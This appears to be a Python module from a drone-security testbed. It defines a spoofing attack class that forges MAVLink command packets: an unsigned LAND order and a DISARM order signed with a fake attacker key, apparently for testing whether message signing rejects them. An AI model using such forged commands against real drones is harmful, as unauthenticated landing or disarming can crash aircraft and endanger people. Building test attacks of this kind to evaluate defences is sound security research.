"""Attaque par Usurpation / Injection Forgee (Spoofing Attack).

Genere des commandes de pilotage (ex: MAV_CMD_NAV_LAND ou DESARMEMENT)
sans disposer de la cle secrete authentique.
"""

from __future__ import annotations

import logging

from src.common.config import DEFAULT_CONFIG
from src.common.protocol import MavlinkCodec, mavlink2

logger = logging.getLogger("hybridlink.attacker.spoofing")


class SpoofingAttack:
    """Injecteur d'ordres pirates non authentifies."""

    def __init__(self, attacker_key: bytes | None = None) -> None:
        # Fausse cle d'attaquant inconnue du drone
        fake_key = attacker_key or b"AttackerRogueKey1234567890123456"
        self.codec_signed_bogus = MavlinkCodec(
            sys_id=DEFAULT_CONFIG.GCS_SYSID,
            comp_id=DEFAULT_CONFIG.GCS_COMPID,
            secret_key=fake_key,
            link_id=1,
        )
        self.codec_unsigned = MavlinkCodec(
            sys_id=DEFAULT_CONFIG.GCS_SYSID,
            comp_id=DEFAULT_CONFIG.GCS_COMPID,
            secret_key=None,
        )

    def generate_unsigned_land_command(self) -> bytes:
        """Genere une commande d'atterrissage sans aucune signature (MAVLink v1 / v2 non signe)."""
        logger.warning("[ATTAQUE SPOOFING] Forgerie d'un ordre LAND non signe...")
        return self.codec_unsigned.encode_command_long(
            target_system=DEFAULT_CONFIG.VEHICLE_SYSID,
            target_component=DEFAULT_CONFIG.VEHICLE_COMPID,
            command_id=mavlink2.MAV_CMD_NAV_LAND,
        )

    def generate_bogus_signed_disarm_command(self) -> bytes:
        """Genere une commande de desarment signee avec une fausse cle privee."""
        logger.warning("[ATTAQUE SPOOFING] Forgerie d'un ordre DISARM avec fausse cle...")
        return self.codec_signed_bogus.encode_command_long(
            target_system=DEFAULT_CONFIG.VEHICLE_SYSID,
            target_component=DEFAULT_CONFIG.VEHICLE_COMPID,
            command_id=mavlink2.MAV_CMD_COMPONENT_ARM_DISARM,
            param1=0.0,  # 0.0 = Disarm
        )
